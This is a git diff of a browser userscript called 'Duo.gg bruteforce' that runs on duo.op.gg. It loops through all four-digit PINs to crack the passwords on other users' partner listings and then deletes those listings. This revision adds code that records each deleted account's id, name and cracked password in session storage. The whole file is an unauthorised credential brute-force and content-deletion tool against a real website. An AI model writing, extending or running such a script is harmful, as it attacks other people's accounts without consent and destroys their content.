@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Duo.gg bruteforce
 // @namespace    https://github.com/HigorJardini/Manhattan-Project/
-// @version      0.2
+// @version      0.4
 // @description  op.gg
 // @author       You
 // @match        *://duo.op.gg/*/lol/
@@ -105,11 +105,21 @@ for (let i = 0; i <= 9999; i++) {
   }
 }
 
+async function sessionDeletedAccountsSaving(deleted_accounts) {
+  var session = sessionStorage.getItem("deleted_accounts");
+  if (session != null){
+    deleted_accounts = deleted_accounts.concat(JSON.parse(session));
+    sessionStorage.removeItem('deleted_accounts');
+  }
+
+  sessionStorage.setItem("deleted_accounts", JSON.stringify(deleted_accounts));
+  
+}
+
 var senhas = numbersArray;
 var i;
 
 async function wipeDay(){
-    var c4 = [];
 
     var y = 0;
     const divs = document.querySelectorAll('[id^="partner-"].flex.items-center');
@@ -124,15 +134,14 @@ async function wipeDay(){
           icon: 'info',
           title: 'Deletando o usuario: ' + name
       })
-      var res = await httpRequest(uniqueNumbers[y], name);
+      await httpRequest(uniqueNumbers[y], name);
       //console.log(res);
-      c4.push(res);
     }
 
     $('#myButton').css('background-color','#e84057').prop("disabled",false);
 
     //console.clear();
-    //console.log(c4);
+    //console.log(deleted_accounts);
 }
 
 async function httpRequest(id, name) {
@@ -163,14 +172,17 @@ async function httpRequest(id, name) {
          }
        } else if (kboom == true) {
          //console.log('Senhas encontrada: ' + i + '/' + senhas.length + ' - (' + senhas[i] + ', ' + kboom + ') - Usuario: ' + name)
-         await Toast.fire({
-             icon: 'success',
-             title: 'Usuario deletado: ' + name + ', senha: ' + senhas[i]
-         })
-         return {
+         let obj_deleted = {
                   'Id': id,
-                  'Senha':senhas[i]
+                  'Name': name,
+                  'Password':senhas[i]
                 }
+         await sessionDeletedAccountsSaving([obj_deleted]);
+
+         await Toast.fire({
+          icon: 'success',
+          title: 'Usuario deletado: ' + name + ', senha: ' + senhas[i]
+         })
        } else {
          await httpRequest(id);
        }
@@ -208,6 +220,5 @@ async function TheBomb(id,pass){
 
 
 }
-
 
 })();
